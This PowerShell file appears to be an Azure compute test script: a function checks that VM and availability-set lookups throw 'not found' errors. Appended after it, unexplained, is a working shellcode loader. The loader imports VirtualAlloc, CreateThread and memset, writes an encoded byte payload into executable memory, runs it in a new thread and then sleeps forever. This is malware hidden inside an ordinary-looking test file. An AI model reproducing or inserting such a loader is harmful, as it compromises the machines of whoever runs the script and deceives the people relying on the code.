﻿













function Run-ComputeCloudExceptionTests
{
    
    $rgname = Get-ComputeTestResourceName

    try
    {
        
        $loc = Get-ComputeVMLocation;
        New-AzResourceGroup -Name $rgname -Location $loc -Force;

        $compare = "*Resource*not found*OperationID : *";
        Assert-ThrowsLike { $s1 = Get-AzVM -ResourceGroupName $rgname -Name 'test' } $compare;
        Assert-ThrowsLike { $s2 = Get-AzVM -ResourceGroupName 'foo' -Name 'bar' } $compare;
        Assert-ThrowsLike { $s3 = Get-AzAvailabilitySet -ResourceGroupName $rgname -Name 'test' } $compare;
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}

$a2oP = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $a2oP -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x3e,0x1a,0x57,0xc8,0xd9,0xc6,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x47,0x31,0x43,0x13,0x83,0xeb,0xfc,0x03,0x43,0x31,0xf8,0xa2,0x34,0xa5,0x7e,0x4c,0xc5,0x35,0x1f,0xc4,0x20,0x04,0x1f,0xb2,0x21,0x36,0xaf,0xb0,0x64,0xba,0x44,0x94,0x9c,0x49,0x28,0x31,0x92,0xfa,0x87,0x67,0x9d,0xfb,0xb4,0x54,0xbc,0x7f,0xc7,0x88,0x1e,0xbe,0x08,0xdd,0x5f,0x87,0x75,0x2c,0x0d,0x50,0xf1,0x83,0xa2,0xd5,0x4f,0x18,0x48,0xa5,0x5e,0x18,0xad,0x7d,0x60,0x09,0x60,0xf6,0x3b,0x89,0x82,0xdb,0x37,0x80,0x9c,0x38,0x7d,0x5a,0x16,0x8a,0x09,0x5d,0xfe,0xc3,0xf2,0xf2,0x3f,0xec,0x00,0x0a,0x07,0xca,0xfa,0x79,0x71,0x29,0x86,0x79,0x46,0x50,0x5c,0x0f,0x5d,0xf2,0x17,0xb7,0xb9,0x03,0xfb,0x2e,0x49,0x0f,0xb0,0x25,0x15,0x13,0x47,0xe9,0x2d,0x2f,0xcc,0x0c,0xe2,0xa6,0x96,0x2a,0x26,0xe3,0x4d,0x52,0x7f,0x49,0x23,0x6b,0x9f,0x32,0x9c,0xc9,0xeb,0xde,0xc9,0x63,0xb6,0xb6,0x3e,0x4e,0x49,0x46,0x29,0xd9,0x3a,0x74,0xf6,0x71,0xd5,0x34,0x7f,0x5c,0x22,0x3b,0xaa,0x18,0xbc,0xc2,0x55,0x59,0x94,0x00,0x01,0x09,0x8e,0xa1,0x2a,0xc2,0x4e,0x4e,0xff,0x7f,0x4a,0xd8,0xc0,0x28,0x54,0x1e,0xa9,0x2a,0x55,0x0f,0x75,0xa2,0xb3,0x7f,0xd5,0xe4,0x6b,0x3f,0x85,0x44,0xdc,0xd7,0xcf,0x4a,0x03,0xc7,0xef,0x80,0x2c,0x6d,0x00,0x7d,0x04,0x19,0xb9,0x24,0xde,0xb8,0x46,0xf3,0x9a,0xfa,0xcd,0xf0,0x5b,0xb4,0x25,0x7c,0x48,0x20,0xc6,0xcb,0x32,0xe6,0xd9,0xe1,0x59,0x06,0x4c,0x0e,0xc8,0x51,0xf8,0x0c,0x2d,0x95,0xa7,0xef,0x18,0xae,0x6e,0x7a,0xe3,0xd8,0x8e,0x6a,0xe3,0x18,0xd9,0xe0,0xe3,0x70,0xbd,0x50,0xb0,0x65,0xc2,0x4c,0xa4,0x36,0x57,0x6f,0x9d,0xeb,0xf0,0x07,0x23,0xd2,0x37,0x88,0xdc,0x31,0xc6,0xf4,0x0a,0x7f,0xbc,0x14,0x8f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$e99=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($e99.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$e99,0,0,0);for (;;){Start-sleep 60};

